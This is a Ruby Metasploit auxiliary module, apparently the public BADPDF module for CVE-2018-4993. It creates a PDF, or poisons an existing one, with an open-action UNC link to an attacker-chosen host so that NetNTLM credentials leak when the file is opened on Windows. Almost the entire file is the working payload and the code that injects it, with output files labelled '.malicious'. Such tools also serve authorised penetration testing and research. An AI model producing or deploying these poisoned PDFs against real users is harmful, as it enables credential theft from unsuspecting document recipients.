##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::FILEFORMAT

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'BADPDF Malicious PDF Creator',
        'Description'   => %q{
          This module can either creates a blank PDF file which contains a UNC link which can be used
          to capture NetNTLM credentials, or if the PDFINJECT option is used it will inject the necessary
          code into an existing PDF document if possible.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
            [
              'Richard Davy - secureyourit.co.uk',  #Module written by Richard Davy
              'CheckPoint researchers - Assaf Baharav, Yaron Fruchtmann, Ido Solomon' #Code provided as POC by CheckPoint Researchers
            ],
        'Platform'      => [ 'win' ],
        'References'    =>
        [
          ['CVE', '2018-4993'],
          ['URL', 'https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/']
        ]

      ))
    register_options(
      [
        OptAddress.new("LHOST", [ true, "Host listening for incoming SMB/WebDAV traffic", nil]),
        OptString.new("FILENAME", [ false, "Filename"]),
        OptString.new("PDFINJECT", [ false, "Path and filename to existing PDF to inject UNC link code into"]),

      ])
  end

  def run
    if datastore['PDFINJECT']!= nil
        injectpdf
    else
        if datastore['FILENAME']!= nil
          createpdf
        else
          print_error "FILENAME is empty, please enter FILENAME and rerun module"
        end
    end
  end

  def injectpdf
    #Payload which gets injected
    inject_payload = "/AA <</O <</F (\\\\\\\\#{datastore['LHOST']}\\\\test)/D [ 0 /Fit]/S /GoToE>>>>"

    if File.exists?(datastore['PDFINJECT'])
      #Read in contents of file
      content = File.read(datastore['PDFINJECT'])

      #Check for place holder
      if content.index("/Contents 4 0 R") != nil
        #If place holder exists create new file content
        newdata = content[0..(content.index('/Contents 4 0 R')+14)]+inject_payload+content[(content.index('/Contents 4 0 R')+15)..-1]
      elsif content.index("/Contents 8 0 R") != nil
        #If place holder exists create new file content
        newdata = content[0..(content.index('/Contents 8 0 R')+14)]+inject_payload+content[(content.index('/Contents 8 0 R')+15)..-1]
      end

      if newdata != nil
        #Write content to file
        File.open(datastore['PDFINJECT']+".malicious", 'wb') { |file| file.write(newdata) }
        #Check file exists and display path or error message
        if File.exists?(datastore['PDFINJECT']+".malicious")
          print_good("Malicious file writen to #{datastore['PDFINJECT']}"+".malicious")
        else
          print_error "Something went wrong creating malicious PDF file"
        end
      #If place holder cannot be found display error message
      else
        print_error "Could not find placeholder to poison file this time...."
      end
    else
      #If file not found display error message
      print_error "File doesn't exist #{datastore['PDFINJECT']}"
    end

  end

  def createpdf
    #Code below taken POC provided by CheckPoint Research
    pdf = ""
    pdf << "%PDF-1.7\n"
    pdf << "1 0 obj\n"
    pdf << "<</Type/Catalog/Pages 2 0 R>>\n"
    pdf << "endobj\n"
    pdf << "2 0 obj\n"
    pdf << "<</Type/Pages/Kids[3 0 R]/Count 1>>\n"
    pdf << "endobj\n"
    pdf << "3 0 obj\n"
    pdf << "<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>\n"
    pdf << "endobj\n"
    pdf << "xref\n"
    pdf << "0 4\n"
    pdf << "0000000000 65535 f\n"
    pdf << "0000000015 00000 n\n"
    pdf << "0000000060 00000 n\n"
    pdf << "0000000111 00000 n\n"
    pdf << "trailer\n"
    pdf << "<</Size 4/Root 1 0 R>>\n"
    pdf << "startxref\n"
    pdf << "190\n"
    pdf << "3 0 obj\n"
    pdf << "<< /Type /Page\n"
    pdf << "   /Contents 4 0 R\n"
    pdf << "   /AA <<\n"
    pdf << "     /O <<\n"
    pdf << "        /F (\\\\\\\\#{datastore['LHOST']}\\\\test)\n"
    pdf << "      /D [ 0 /Fit]\n"
    pdf << "      /S /GoToE\n"
    pdf << "      >>\n"
    pdf << "     >>\n"
    pdf << "     /Parent 2 0 R\n"
    pdf << "     /Resources <<\n"
    pdf << "      /Font <<\n"
    pdf << "        /F1 <<\n"
    pdf << "          /Type /Font\n"
    pdf << "          /Subtype /Type1\n"
    pdf << "          /BaseFont /Helvetica\n"
    pdf << "          >>\n"
    pdf << "         >>\n"
    pdf << "       >>\n"
    pdf << ">>\n"
    pdf << "endobj\n"
    pdf << "4 0 obj<< /Length 100>>\n"
    pdf << "stream\n"
    pdf << "BT\n"
    pdf << "/TI_0 1 Tf\n"
    pdf << "14 0 0 14 10.000 753.976 Tm\n"
    pdf << "0.0 0.0 0.0 rg\n"
    pdf << "(PDF Document) Tj\n"
    pdf << "ET\n"
    pdf << "endstream\n"
    pdf << "endobj\n"
    pdf << "trailer\n"
    pdf << "<<\n"
    pdf << "  /Root 1 0 R\n"
    pdf << ">>\n"
    pdf << "%%EOF\n"
    #Write data to filename
    file_create(pdf)
  end

end
